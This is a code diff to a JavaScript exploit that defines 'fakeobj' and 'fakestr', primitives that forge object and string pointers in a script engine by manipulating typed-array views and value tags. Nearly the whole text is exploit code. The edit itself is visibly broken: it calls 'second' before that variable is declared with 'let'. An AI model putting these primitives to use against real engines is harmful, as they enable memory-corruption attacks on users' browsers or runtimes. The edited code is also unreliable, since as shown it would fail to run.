@@ -20,13 +20,13 @@ let fakeobj = function(thing){
     bitview[1] = Math.floor(thing/temp);
     bitview[0] = thing >>> 0;
     let first = {"int" : 420, "object" : floatview[0]};
-    o1.eight();
+    second.eight();
     let second = {"val" : o1.gg, "floattag" : -1};
-    o.eight();
+    first.eight();
     const result = o.hi;
     
-    o1.eight();
-    o.eight();
+    second.eight();
+    first.eight();
     return result;
 };
 
@@ -36,14 +36,14 @@ let fakestr = function(thing){
     bitview[0] = thing >>> 0;
     let first = {"int" : 420, "object" : floatview[0]};
     // shift the first value plane
-    o1.eight();
+    second.eight();
     let second = {"val" : o1.gg, "floattag" : -7};
     // shift the second value plane
     // suddenly, value of thing is now tagged with a str!
-    o.eight();
+    first.eight();
     let fakedstr = o.hi;
     // reshift to not corrupt pointers
-    o1.eight();
-    o.eight();
+    second.eight();
+    first.eight();
     return fakedstr;
 };
